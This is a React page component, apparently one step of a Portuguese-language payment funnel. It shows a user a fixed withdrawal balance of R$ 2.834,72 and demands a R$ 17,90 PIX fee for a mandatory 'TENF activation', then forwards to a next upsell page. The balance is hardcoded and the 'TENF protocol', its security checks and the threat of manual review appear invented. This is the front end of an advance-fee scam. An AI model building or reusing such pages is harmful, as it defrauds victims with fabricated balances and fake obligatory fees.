import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import ParadisePixPopup from '@/components/ParadisePixPopup';
import PageTransition from '@/components/PageTransition';
import { trackViewContent } from '@/lib/tiktokPixel';
import { useCustomerData } from '@/hooks/useCustomerData';
import '../styles/app.css';

const SALDO_FINAL = 2834.72;
const TAXA_TENF = 17.90;
const TAXA_TENF_CENTAVOS = 1790;
const PRODUCT_HASH = 'prod_up1_tenf_ativacao';

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up1 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);
  const { customer } = useCustomerData();

  useEffect(() => {
    trackViewContent('Ativação TENF', TAXA_TENF);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up2');
  };

  return (
    <PageTransition>
      <main className="upsell-page">
        <div className="title">Ativação TENF</div>

        <div className="upsell-card">
          <h1 className="upsell-heading">
            Ativação TENF obrigatória para saques acima de R$ 1.500
          </h1>

          <p className="upsell-text">
            Para concluir a liberação do seu saque de{' '}
            <span className="highlight-value">R$ {formatBR(SALDO_FINAL)}</span>
            , é obrigatório ativar o protocolo TENF.
          </p>

          <div className="info-box">
            <p className="info-text">
              Saque sem TENF não é processado pelo sistema de segurança e é automaticamente direcionado para análise manual, o que impede a liberação do valor.
            </p>
          </div>

          <h2 className="upsell-subtitle">O TENF é exigido para:</h2>

          <ul className="upsell-list">
            {[
              'Validar identidade',
              'Confirmar origem do saldo',
              'Autorizar liberação de valores elevados',
              'Evitar bloqueios e retenções',
            ].map((item, idx) => (
              <li key={idx} className="upsell-list-item">
                <span className="list-bullet" />
                {item}
              </li>
            ))}
          </ul>

          <div className="info-box">
            <p className="info-text">
              Sem a ativação, o saque permanece pendente e não é liberado.
            </p>
          </div>

          <div className="price-row">
            <span className="price-label">Valor da ativação</span>
            <span className="price-value">R$ {formatBR(TAXA_TENF)}</span>
          </div>

          <button
            onClick={() => setShowPixPopup(true)}
            className="cta-button cta-primary"
          >
            Ativar TENF obrigatório
          </button>

          <p className="cta-footnote">
            A ativação é obrigatória para saques acima de R$ 1.500
          </p>
        </div>

        {showPixPopup && (
          <ParadisePixPopup
            amount={TAXA_TENF_CENTAVOS}
            description="Ativação TENF obrigatório"
            productHash={PRODUCT_HASH}
            customer={customer}
            onSuccess={handlePaymentSuccess}
            onClose={() => setShowPixPopup(false)}
          />
        )}
      </main>
    </PageTransition>
  );
};

export default Up1;
